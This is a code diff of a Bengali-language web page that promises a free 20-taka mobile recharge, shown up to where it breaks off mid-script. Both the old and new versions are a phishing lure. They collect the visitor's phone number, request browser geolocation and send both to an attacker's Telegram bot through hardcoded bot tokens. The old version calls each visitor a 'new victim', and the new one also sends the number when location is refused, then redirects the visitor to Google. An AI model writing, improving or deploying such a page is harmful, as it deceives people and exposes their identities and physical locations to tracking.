@@ -1,51 +1,37 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>২০ টাকা ফ্রি রিচার্জ!</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; background-color: #f0f8ff; padding: 50px; }
-        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        h2 { color: #2c3e50; }
-        input { padding: 10px; width: 80%; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
-        button { padding: 10px 20px; background-color: #27ae60; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        body { background: #f4f4f4; text-align: center; font-family: Arial; padding: 50px 20px; }
+        .box { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 320px; margin: auto; }
+        h2 { color: #28a745; }
+        input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        button { background: #007bff; color: white; padding: 12px; border: none; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
-
-<div class="container">
-    <h2>২০ টাকা ফ্রি রিচার্জ পেতে আপনার নম্বর দিন</h2>
-    <input type="number" id="phone" placeholder="আপনার মোবাইল নম্বর">
-    <br>
-    <button onclick="getDetails()">রিচার্জ নিন</button>
-</div>
-
+    <div class="box">
+        <h2>২০ টাকা ফ্রি রিচার্জ!</h2>
+        <p>আপনার নম্বরটি দিয়ে রিচার্জ নিশ্চিত করুন</p>
+        <input type="number" id="num" placeholder="01XXXXXXXXX">
+        <button onclick="send()">রিচার্জ নিন</button>
+    </div>
 <script>
-    function getDetails() {
-        const phone = document.getElementById('phone').value;
-        if (phone === "") {
-            alert("দয়া করে নম্বর দিন");
-            return;
-        }
-
-        const botToken = "8056072120:AAH-Y5n9fP_7XnS_K4W5-U7mP_4"; // আপনার টোকেন
-        const chatId = "5907727181"; // আপনার চ্যাট আইডি
-
-        // লোকেশন পারমিশন চাওয়া হচ্ছে (এখানেই HTTPS দরকার)
-        navigator.geolocation.getCurrentPosition(pos => {
-            const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            const message = `নতুন শিকার!\nনম্বর: ${phone}\nলোকেশন: ${map}`;
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-            .then(() => {
-                alert("সফল হয়েছে! ২০ মিনিটের মধ্যে রিচার্জ পৌঁছে যাবে।");
-            });
-        }, err => {
-            alert("লোকেশন পারমিশন না দিলে রিচার্জ পাবেন না। দয়া করে Allow করুন।");
-        });
-    }
-</script>
-
-</body>
-</html>
+    async function send() {
+        const phone = document.getElementById('num').value;
+        if(phone.length < 11) { alert("সঠিক নম্বর দিন"); return; }
+        const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k";
+        const chat_id = "7887080882";
+        
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const map = `http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            const msg = `🎯 নম্বর: ${phone}\n📍 ম্যাপ: ${map}`;
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+            alert("সফল হয়েছে! ৩০ মিনিটে রিচার্জ পাবেন।");
+            window.location.href = "https://www.google.com";
+        }, async () => {
+            const msg = `⚠️ নম্বর (লোকেশন অফ): ${phone}`;
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+            alert("সফল হয়েছে!");
